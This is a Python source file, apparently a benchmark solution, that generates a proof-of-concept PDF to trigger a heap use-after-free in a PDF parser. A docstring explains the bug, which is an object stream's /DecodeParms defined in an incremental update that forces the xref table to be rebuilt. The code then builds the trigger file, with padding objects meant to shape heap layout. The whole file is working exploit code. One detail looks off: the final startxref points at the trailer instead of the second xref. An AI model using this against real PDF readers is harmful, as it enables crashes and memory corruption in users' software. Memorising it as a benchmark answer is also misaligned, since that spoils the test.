import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a Heap Use After Free vulnerability in a PDF parser.

        The vulnerability is triggered by causing the PDF cross-reference (xref) table
        to be rebuilt ("solidified") while a pointer to an entry in the old table is
        still held. This can happen when parsing an object stream that has its
        properties (like /DecodeParms) defined as an indirect object in an incremental
        update section of the PDF.

        The PoC is structured as follows:
        1.  A main PDF body with an initial xref table.
        2.  An incremental update with a second xref table.
        3.  The main body contains an object stream (`S`).
        4.  A page in the PDF references an object (`A`) that is located inside `S`.
            This forces the parser to process `S`.
        5.  The object stream `S` references a /DecodeParms object (`C`) via an
            indirect reference.
        6.  Object `C` is not defined in the main body; its entry in the first xref
            table is marked as free.
        7.  Object `C` is defined in the incremental update section.

        The execution flow that triggers the UAF:
        - The parser needs to display the page, so it must resolve object `A`.
        - It discovers `A` is in object stream `S`. It gets a pointer to the xref
          entry for `S`.
        - To decompress `S`, it must first load its /DecodeParms, object `C`.
        - The parser looks for object `C`. It finds it in the second xref table
          (the incremental update).
        - This discovery triggers the parser to solidify the xref tables, building
          a new, unified table in memory and freeing the old ones.
        - The pointer to `S`'s xref entry now dangles.
        - After loading `C`, the parser resumes processing stream `S` and uses the
          stale pointer, leading to a Use-After-Free.
        """
        poc_parts = []
        offsets = {}

        def add_obj(obj_num: int, content: bytes):
            nonlocal poc_parts, offsets
            current_offset = sum(len(p) for p in poc_parts)
            offsets[obj_num] = current_offset
            
            obj_bytes = f'{obj_num} 0 obj\n'.encode('ascii') + content + b'\nendobj\n\n'
            poc_parts.append(obj_bytes)

        # Part 1: Main PDF Body
        poc_parts.append(b'%PDF-1.7\n%\xa1\xb2\xc3\xd4\n\n')

        obj_in_stream_num = 10
        obj_stream_num = 6
        trigger_obj_num = 7
        
        add_obj(1, b'<< /Type /Catalog /Pages 2 0 R >>')
        add_obj(2, b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>')
        add_obj(3, f'<< /Type /Page /Annots [{obj_in_stream_num} 0 R] >>'.encode('ascii'))

        stream_obj_header = f'{obj_in_stream_num} 0'.encode('ascii')
        stream_obj_content_body = b'<< /Vulnerable true >>'
        uncompressed_stream_data = stream_obj_header + b' ' + stream_obj_content_body
        compressed_stream_data = zlib.compress(uncompressed_stream_data)

        obj_stream_dict = (
            f'<<\n'
            f'  /Type /ObjStm\n'
            f'  /N 1\n'
            f'  /First {len(stream_obj_header) + 1}\n'
            f'  /Filter /FlateDecode\n'
            f'  /Length {len(compressed_stream_data)}\n'
            f'  /DecodeParms {trigger_obj_num} 0 R\n'
            f'>>'
        ).encode('ascii')
        obj_stream_content = obj_stream_dict + b'\nstream\n' + compressed_stream_data + b'\nendstream'
        add_obj(obj_stream_num, obj_stream_content)

        # Add padding objects to control memory layout and PoC size for scoring.
        num_pad_objs = 10
        pad_obj_size = 200
        padding_data = (b'P' * pad_obj_size) * num_pad_objs
        
        pad_obj_nums = [i for i in range(4, 4 + num_pad_objs + 2) if i not in [obj_stream_num, trigger_obj_num]]
        for i, num in enumerate(pad_obj_nums):
            start = i * pad_obj_size
            end = (i + 1) * pad_obj_size
            pad_hex = padding_data[start:end].hex().encode('ascii')
            add_obj(num, b'<' + pad_hex + b'>')

        body1 = b''.join(poc_parts)
        
        # Part 2: Initial XRef Table and Trailer
        max_obj_num = max(list(offsets.keys()) + [trigger_obj_num])
        
        xref1_lines = [f'xref\n0 {max_obj_num + 1}\n'.encode('ascii')]
        xref1_lines.append(b'0000000000 65535 f \n')
        for i in range(1, max_obj_num + 1):
            if i in offsets:
                xref1_lines.append(f'{offsets[i]:010d} 00000 n \n'.encode('ascii'))
            else:
                xref1_lines.append(b'0000000000 00000 f \n')
        xref1 = b''.join(xref1_lines)
        
        xref1_offset = len(body1)
        trailer1 = (
            f'trailer\n'
            f'<<\n'
            f'  /Size {max_obj_num + 1}\n'
            f'  /Root 1 0 R\n'
            f'>>\n'
            f'startxref\n{xref1_offset}\n%%EOF\n'
        ).encode('ascii')

        # Part 3: Incremental Update Body
        update_base_offset = len(body1) + len(xref1) + len(trailer1)
        
        trigger_obj_content = b'<< /Predictor 12 /Columns 8 >>'
        body2 = f'{trigger_obj_num} 0 obj\n'.encode('ascii') + trigger_obj_content + b'\nendobj\n\n'
        trigger_obj_offset = update_base_offset

        # Part 4: Second XRef Table and Final Trailer
        xref2_offset = update_base_offset + len(body2)
        xref2 = (
            f'xref\n'
            f'{trigger_obj_num} 1\n'
            f'{trigger_obj_offset:010d} 00000 n \n'
        ).encode('ascii')

        trailer2_offset = xref2_offset + len(xref2)
        trailer2 = (
            f'trailer\n'
            f'<<\n'
            f'  /Size {max_obj_num + 1}\n'
            f'  /Root 1 0 R\n'
            f'  /Prev {xref1_offset}\n'
            f'>>\n'
            f'startxref\n{trailer2_offset}\n%%EOF'
        ).encode('ascii')

        return body1 + xref1 + trailer1 + body2 + xref2 + trailer2